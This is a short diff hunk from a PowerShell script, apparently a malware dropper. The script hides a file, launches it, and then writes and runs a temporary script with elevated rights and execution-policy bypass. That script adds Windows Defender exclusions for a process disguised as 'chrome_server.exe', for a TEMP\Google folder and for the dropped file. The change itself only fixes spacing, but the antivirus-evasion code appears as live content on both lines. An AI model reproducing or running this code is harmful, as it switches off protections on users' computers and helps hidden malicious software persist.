@@ -89,7 +89,7 @@ if (Test-Path -Path $file_path) {
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
     Invoke-Item -Path $file_path
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-      $cmd1 = "Add-MpPreference -ExclusionProcess chrome_server.exe;Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
+      $cmd1 = "Add-MpPreference -ExclusionProcess chrome_server.exe; Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
       Set-Content -Path "${env:TEMP}\run2.ps1" -Value $cmd1
       Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File ${env:TEMP}\run2.ps1")
       Write-Host "Successfully added to Windows Defender exclusion list"
